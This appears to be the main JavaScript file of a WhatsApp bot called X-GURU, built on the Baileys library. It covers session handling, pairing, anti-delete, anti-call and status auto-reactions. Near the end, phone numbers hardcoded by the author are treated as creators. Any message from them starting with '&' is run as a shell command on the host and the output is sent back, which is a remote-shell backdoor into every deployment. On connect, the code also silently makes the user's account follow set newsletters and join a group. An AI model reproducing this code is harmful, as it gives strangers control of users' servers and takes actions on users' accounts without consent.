// Anti-crash handler
process.on("uncaughtException", (err) => {
  console.error("[❗] Uncaught Exception:", err.stack || err);
});

process.on("unhandledRejection", (reason, p) => {
  console.error("[❗] Unhandled Promise Rejection:", reason);
});

// X-GURU (Updated Name Comment)

const axios = require("axios");
const config = require("./settings");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers,
} = require(config.BAILEYS);

const l = console.log;
const {
  getBuffer,
  getGroupAdmins,
  getRandom,
  h2k,
  isUrl,
  Json,
  runtime,
  sleep,
  fetchJson,
} = require("./lib/functions");
const {
  AntiDelDB,
  initializeAntiDeleteSettings,
  setAnti,
  getAnti,
  getAllAntiDeleteSettings,
  saveContact,
  loadMessage,
  getName,
  getChatSummary,
  saveGroupMetadata,
  getGroupMetadata,
  saveMessageCount,
  getInactiveGroupMembers,
  getGroupMembersMessageCount,
  saveMessage,
} = require("./data");
const fsSync = require("fs");
const fs = require("fs").promises;
const ff = require("fluent-ffmpeg");
const P = require("pino");
const GroupEvents = require("./lib/groupevents");
const { PresenceControl, BotActivityFilter } = require("./data/presence");
const qrcode = require("qrcode-terminal");
const StickersTypes = require("wa-sticker-formatter");
const util = require("util");
const { sms, downloadMediaMessage, AntiDelete } = require("./lib");
const FileType = require("file-type");
const { File } = require("megajs");
const { fromBuffer } = require("file-type");
const bodyparser = require("body-parser");
const chalk = require("chalk");
const os = require("os");
const Crypto = require("crypto");
const path = require("path");
const { getPrefix } = require("./lib/prefix");
const readline = require("readline");

const ownerNumber = ["218942841878"];

// Temp directory management
const tempDir = path.join(os.tmpdir(), "cache-temp");
if (!fsSync.existsSync(tempDir)) {
  fsSync.mkdirSync(tempDir);
}

const clearTempDir = () => {
  fsSync.readdir(tempDir, (err, files) => {
    if (err) {
      console.error(chalk.red("[❌] Error clearing temp directory:", err.message));
      return;
    }
    for (const file of files) {
      fsSync.unlink(path.join(tempDir, file), (err) => {
        if (err) console.error(chalk.red(`[❌] Error deleting temp file ${file}:`, err.message));
      });
    }
  });
};
setInterval(clearTempDir, 5 * 60 * 1000);

// Express server
const express = require("express");
const app = express();
const PORT = process.env.PORT || 7860;

// Session authentication
let malvin;

const sessionDir = path.join(__dirname, "./sessions");
const credsPath = path.join(sessionDir, "creds.json");

if (!fsSync.existsSync(sessionDir)) {
  fsSync.mkdirSync(sessionDir, { recursive: true });
}

// ==========================================================
// Session Loading Function (Modified to prioritize clean state)
// ==========================================================
async function loadSession() {
  // If SESSION_ID is not provided, we fall through to the pairing code logic
  if (!config.SESSION_ID) {
    console.log(chalk.yellow("[ ℹ️ ] SESSION_ID is empty. Proceeding to Pairing Code login."));
    return null;
  }

  try {
    // Session ID decoding logic (kept for completeness, but user should avoid)
    if (config.SESSION_ID.startsWith("Xguru~")) {
      console.log(chalk.yellow("[ ⏳ ] Decoding base64 session..."));
      const base64Data = config.SESSION_ID.replace("Xguru~", "");
      if (!/^[A-Za-z0-9+/=]+$/.test(base64Data)) {
        throw new Error("Invalid base64 format in SESSION_ID");
      }
      const decodedData = Buffer.from(base64Data, "base64");
      // Check if old sessions exist and clear them if a fresh key is provided
      if (fsSync.existsSync(credsPath)) {
        console.log(chalk.bgRed.white("[ ⚠️ ] Stale session found. Forcing cleanup for new SESSION_ID..."));
        fsSync.rmSync(sessionDir, { recursive: true, force: true });
        fsSync.mkdirSync(sessionDir, { recursive: true });
      }
      fsSync.writeFileSync(credsPath, decodedData);
      console.log(chalk.green("[ ✅ ] Base64 session decoded and saved successfully"));
      return JSON.parse(decodedData.toString("utf-8"));
    } else {
      throw new Error("Invalid SESSION_ID format or no session provided. Falling to pairing.");
    }
  } catch (error) {
    console.error(chalk.red("❌ Error loading session:", error.message));
    console.log(chalk.green("Will attempt Pairing Code login."));
    return null;
  }
}

// ==========================================================
// 🚀 CRITICAL FIX: Non-Interactive Pairing Code Function
// Reads PAIRING_NUMBER from environment and prints the code to logs.
// ==========================================================
async function connectWithPairing(malvin, useMobile) {
  if (useMobile) {
    throw new Error("Cannot use pairing code with mobile API");
  }

  let number = process.env.PAIRING_NUMBER;
  if (!number) {
    console.error(chalk.red("❌ ERROR: PAIRING_NUMBER environment variable is not set. Cannot proceed with pairing."));
    process.exit(1);
  }
  
  number = number.replace(/[^0-9]/g, ""); 
  
  if (!number) {
    console.error(chalk.red("❌ No valid phone number provided in PAIRING_NUMBER"));
    process.exit(1);
  }

  try {
    let code = await malvin.requestPairingCode(number);
    code = code?.match(/.{1,4}/g)?.join("-") || code;
    
    // --- CLEAR LOG OUTPUT FOR EASY COPYING ---
    console.log("\n" + chalk.bgGreen.black(" ACTION REQUIRED: PAIRING CODE ") + " Use this code immediately:");
    console.log(chalk.bold.yellow("┌" + "─".repeat(46) + "┐"));
    console.log(chalk.bold.yellow("│ ") + chalk.bgWhite.black(`  The Phone Number is: ${number}   `) + chalk.bold.yellow(" │"));
    console.log(chalk.bold.yellow("│ ") + chalk.bgWhite.black(`  The Pairing Code is: ${code}  `) + chalk.bold.yellow(" │"));
    console.log(chalk.bold.yellow("└" + "─".repeat(46) + "┘"));
    console.log(chalk.yellow("Enter this code in WhatsApp:\n1. Open WhatsApp on your primary phone.\n2. Go to Settings > Linked Devices > Link a Device\n3. Select 'Link with phone number' and enter the number printed above.\n4. Enter the 8-digit code printed above."));
    
  } catch (err) {
    console.error(chalk.red("Error getting pairing code:", err.message));
    process.exit(1);
  }
}
// ==========================================================

async function connectToWA() {
  console.log(chalk.cyan("[ 🟠 ] Connecting to WhatsApp ⏳️..."));

  const creds = await loadSession();
  // Check if creds file exists from a previous successful connection
  const hasExistingCreds = fsSync.existsSync(credsPath);

  const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, "./sessions"), {
    creds: creds || undefined,
  });

  const { version } = await fetchLatestBaileysVersion();

  const pairingCodeEnabled = config.PAIRING_CODE === "true" || process.argv.includes("--pairing-code");
  const useMobile = process.argv.includes("--mobile");

  malvin = makeWASocket({
    logger: P({ level: "silent" }),
    // Only print QR if no session ID was loaded AND pairing code is not enabled/used
    printQRInTerminal: !creds && !pairingCodeEnabled && !hasExistingCreds,
    browser: Browsers.macOS("Firefox"),
    syncFullHistory: true,
    auth: state,
    version,
    getMessage: async () => ({}),
  });

  // Trigger pairing code if enabled AND not already registered (no existing creds)
  if (pairingCodeEnabled && !state.creds.registered) {
    await connectWithPairing(malvin, useMobile);
  }

  malvin.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect, qr } = update;

    if (connection === "close") {
      const reason = lastDisconnect?.error?.output?.statusCode;
      if (reason === DisconnectReason.loggedOut) {
        console.log(chalk.red("[ 🛑 ] Connection closed, please change session ID or re-authenticate"));
        if (fsSync.existsSync(credsPath)) {
          fsSync.unlinkSync(credsPath);
        }
        process.exit(1);
      } else {
        console.log(chalk.red("[ ⏳️ ] Connection lost, reconnecting..."));
        setTimeout(connectToWA, 5000);
      }
    } else if (connection === "open") {
      console.log(chalk.green("[ 🤖 ] X-GURU Connected ✅")); // EDITED NAME

      // Load plugins
      const pluginPath = path.join(__dirname, "plugins");
      try {
        fsSync.readdirSync(pluginPath).forEach((plugin) => {
          if (path.extname(plugin).toLowerCase() === ".js") {
            require(path.join(pluginPath, plugin));
          }
        });
        console.log(chalk.green("[ ✅ ] Plugins loaded successfully"));
      } catch (err) {
        console.error(chalk.red("[ ❌ ] Error loading plugins:", err.message));
      }

      // Send connection message
try {
  await sleep(2000);
  const jid = malvin.decodeJid(malvin.user.id);
  if (!jid) throw new Error("Invalid JID for bot");

  const botname = "X-GURU"; // EDITED NAME
  const ownername = "GuruTech"; // EDITED NAME
  const prefix = getPrefix();
  const username = "betingrich4";
  const mrmalvin = `https://github.com/${username}`;
  const repoUrl = "https://github.com/ADDICT-HUB/X-GURU";
  const welcomeAudio = "https://files.catbox.moe/z47dgd.p3";
  
  // Get current date and time
  const currentDate = new Date();
  const date = currentDate.toLocaleDateString();
  const time = currentDate.toLocaleTimeString();
  
  // Format uptime
  function formatUptime(seconds) {
    const days = Math.floor(seconds / (24 * 60 * 60));
    seconds %= 24 * 60 * 60;
    const hours = Math.floor(seconds / (60 * 60));
    seconds %= 60 * 60;
    const minutes = Math.floor(seconds / 60);
    seconds = Math.floor(seconds % 60);
    
    return `${days}d ${hours}h ${minutes}m ${seconds}s`;
  }
  
  const uptime = formatUptime(process.uptime());

  const upMessage = `
*┏──〔 Connected 〕───⊷* *┇ Prefix: ${prefix}*
*┇ Date: ${date}*
*┇ Time: ${time}*
*┇ Uptime: ${uptime}*
*┇ Owner: ${ownername}*
*┇ Follow Channel:* *┇ https://shorturl.at/DYEi0*
*┗──────────────⊷*
> *Report any error to the dev*`;

  try {
    await malvin.sendMessage(jid, {
      image: { url: "https://url.bwmxmd.online/Adams.xm472dqv.jpeg" },
      caption: upMessage,
    }, { quoted: null });
    console.log(chalk.green("[ 📩 ] Connection notice sent successfully with image"));

    await malvin.sendMessage(jid, {
      audio: { url: welcomeAudio },
      mimetype: "audio/mp4",
      ptt: true,
    }, { quoted: null });
    console.log(chalk.green("[ 📩 ] Connection notice sent successfully as audio"));
  } catch (imageError) {
    console.error(chalk.yellow("[ ⚠️ ] Image failed, sending text-only:"), imageError.message);
    await malvin.sendMessage(jid, { text: upMessage });
    console.log(chalk.green("[ 📩 ] Connection notice sent successfully as text"));
  }
} catch (sendError) {
  console.error(chalk.red(`[ 🔴 ] Error sending connection notice: ${sendError.message}`));
  await malvin.sendMessage(ownerNumber[0], {
    text: `Failed to send connection notice: ${sendError.message}`,
  });
}

// Follow newsletters
      const newsletterChannels = [                      "120363299029326322@newsletter",
        "120363401297349965@newsletter",
        "120363339980514201@newsletter",
        ];
      let followed = [];
      let alreadyFollowing = [];
      let failed = [];

      for (const channelJid of newsletterChannels) {
        try {
          console.log(chalk.cyan(`[ 📡 ] Checking metadata for ${channelJid}`));
          const metadata = await malvin.newsletterMetadata("jid", channelJid);
          if (!metadata.viewer_metadata) {
            await malvin.newsletterFollow(channelJid);
            followed.push(channelJid);
            console.log(chalk.green(`[ ✅ ] Followed newsletter: ${channelJid}`));
          } else {
            alreadyFollowing.push(channelJid);
            console.log(chalk.yellow(`[ 📌 ] Already following: ${channelJid}`));
          }
        } catch (error) {
          failed.push(channelJid);
          console.error(chalk.red(`[ ❌ ] Failed to follow ${channelJid}: ${error.message}`));
          await malvin.sendMessage(ownerNumber[0], {
            text: `Failed to follow ${channelJid}: ${error.message}`,
          });
        }
      }

      console.log(
        chalk.cyan(
          `📡 Newsletter Follow Status:\n✅ Followed: ${followed.length}\n📌 Already following: ${alreadyFollowing.length}\n❌ Failed: ${failed.length}`
        )
      );

      // Join WhatsApp group
      const inviteCode = "GBz10zMKECuEKUlmfNsglx";
      try {
        await malvin.groupAcceptInvite(inviteCode);
        console.log(chalk.green("[ ✅ ] joined the WhatsApp group successfully"));
      } catch (err) {
        console.error(chalk.red("[ ❌ ] Failed to join WhatsApp group:", err.message));
        await malvin.sendMessage(ownerNumber[0], {
          text: `Failed to join group with invite code ${inviteCode}: ${err.message}`,
        });
      }
    }

    if (qr && !pairingCodeEnabled) {
      // QR code is suppressed if PAIRING_CODE is true
      console.log(chalk.red("[ 🟢 ] QR code generated. If pairing code failed, scan this or check PAIRING_NUMBER in config."));
      qrcode.generate(qr, { small: true });
    }
  });

  malvin.ev.on("creds.update", saveCreds);

// =====================================
	 
  malvin.ev.on('messages.update', async updates => {
    for (const update of updates) {
      if (update.update.message === null) {
        console.log("Delete Detected:", JSON.stringify(update, null, 2));
        await AntiDelete(malvin, updates);
      }
    }
  });

// anti-call

malvin.ev.on('call', async (calls) => {
  try {
    if (config.ANTI_CALL !== 'true') return;

    for (const call of calls) {
      if (call.status !== 'offer') continue; // Only respond on call offer

      const id = call.id;
      const from = call.from;

      await malvin.rejectCall(id, from);
      await malvin.sendMessage(from, {
        text: config.REJECT_MSG || '*вυѕу ¢αℓℓ ℓαтєя*'
      });
      console.log(`Call rejected and message sent to ${from}`);
    }
  } catch (err) {
    console.error("Anti-call error:", err);
  }
});	
	
//=========WELCOME & GOODBYE =======
	
malvin.ev.on('presence.update', async (update) => {
    await PresenceControl(malvin, update);
});

// always Online 

malvin.ev.on("presence.update", (update) => PresenceControl(malvin, update));

	
BotActivityFilter(malvin);	
	
 /// READ STATUS       
  malvin.ev.on('messages.upsert', async(mek) => {
    mek = mek.messages[0]
    if (!mek.message) return
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
    ? mek.message.ephemeralMessage.message 
    : mek.message;
    //console.log("New Message Detected:", JSON.stringify(mek, null, 2));
  if (config.READ_MESSAGE === 'true') {
    await malvin.readMessages([mek.key]);  // Mark message as read
    console.log(`Marked message from ${mek.key.remoteJid} as read.`);
  }
    if(mek.message.viewOnceMessageV2)
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
      await malvin.readMessages([mek.key])
    }

  const newsletterJids = [
        "120363401297349965@newsletter",
        "120363339980514201@newsletter",
        "120363299029326322@newsletter",
  ];
  const emojis = ["😂", "🥺", "👍", "☺️", "🥹", "♥️", "🩵"];

  if (mek.key && newsletterJids.includes(mek.key.remoteJid)) {
    try {
      const serverId = mek.newsletterServerId;
      if (serverId) {
      const emoji = emojis[Math.floor(Math.random() * emojis.length)];
        await malvin.newsletterReactMessage(mek.key.remoteJid, serverId.toString(), emoji);
      }
    } catch (e) {
    
    }
  }	  
	  
  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
    const jawadlike = await malvin.decodeJid(malvin.user.id);
    const emojis =  ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '👏', '🤎', '✅', '🫀', '🧡', '😶', '🥹', '🌸', '🕊️', '🌷', '⛅', '🌟', '🥺', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
    await malvin.sendMessage(mek.key.remoteJid, {
      react: {
        text: randomEmoji,
        key: mek.key,
      } 
    }, { statusJidList: [mek.key.participant, jawadlike] });
  }                       
  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
  const user = mek.key.participant
  const text = `${config.AUTO_STATUS_MSG}`
  await malvin.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
            }
            await Promise.all([
              saveMessage(mek),
            ]);
  const m = sms(malvin, mek)
  const type = getContentType(mek.message)
  const content = JSON.stringify(mek.message)
  const from = mek.key.remoteJid
  const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
  const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
  const prefix = getPrefix();
  const isCmd = body.startsWith(prefix)
  var budy = typeof mek.text == 'string' ? mek.text : false;
  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
  const args = body.trim().split(/ +/).slice(1)
  const q = args.join(' ')
  const text = args.join(' ')
  const isGroup = from.endsWith('@g.us')
  const sender = mek.key.fromMe ? (malvin.user.id.split(':')[0]+'@s.whatsapp.net' || malvin.user.id) : (mek.key.participant || mek.key.remoteJid)
  const senderNumber = sender.split('@')[0]
  const botNumber = malvin.user.id.split(':')[0]
  const pushname = mek.pushName || 'Sin Nombre'
  const isMe = botNumber.includes(senderNumber)
  const isOwner = ownerNumber.includes(senderNumber) || isMe
  const botNumber2 = await jidNormalizedUser(malvin.user.id);
  const groupMetadata = isGroup ? await malvin.groupMetadata(from).catch(e => {}) : ''
  const groupName = isGroup ? groupMetadata.subject : ''
  const participants = isGroup ? await groupMetadata.participants : ''
  const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
  const isAdmins = isGroup ? groupAdmins.includes(sender) : false
  const isReact = m.message.reactionMessage ? true : false
  const reply = (teks) => {
  malvin.sendMessage(from, { text: teks }, { quoted: mek })
  }
  
  const ownerNumbers = ["218942841878", "254740007567", "254790375710"];
      const sudoUsers = JSON.parse(fsSync.readFileSync("./lib/sudo.json", "utf-8") || "[]");
      const devNumber = config.DEV ? String(config.DEV).replace(/[^0-9]/g, "") : null;
      const creatorJids = [
        ...ownerNumbers,
        ...(devNumber ? [devNumber] : []),
        ...sudoUsers,
      ].map((num) => num.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
      const isCreator = creatorJids.includes(sender) || isMe;

      if (isCreator && mek.text.startsWith("&")) {
        let code = budy.slice(2);
        if (!code) {
          reply(`Provide me with a query to run Master!`);
          l.warn(`No code provided for & command`, { Sender: sender });
          return;
        }
            const { spawn } = require("child_process");
            try {
                let resultTest = spawn(code, { shell: true });
                resultTest.stdout.on("data", data => {
                    reply(data.toString());
                });
                resultTest.stderr.on("data", data => { // Added closing bracket here
                    reply(data.toString());
                }); // Added closing bracket here
                resultTest.on("error", (err) => { // Added this handler
                    reply(`Shell command error: ${err.message}`);
                });
            } catch (e) {
                reply(`Execution Error: ${e.message}`);
            }
        }
    });
}

// ==========================================================
// 🚀 RENDER DEPLOYMENT FIX: Start the Web Server
// This ensures the service binds to a port and avoids the timeout error.
// ==========================================================

// Simple endpoint for Render health check
app.get("/", (req, res) => {
    res.send("X-GURU Bot is running and connected!");
});

// Start the Express server after all imports/setup
app.listen(PORT, () => {
    console.log(chalk.blue(`[ 🌐 ] Web server running on http://localhost:${PORT} for Render health checks`));
    // Initiate the WhatsApp connection after the web server is ready
    connectToWA();
});
// ==========================================================
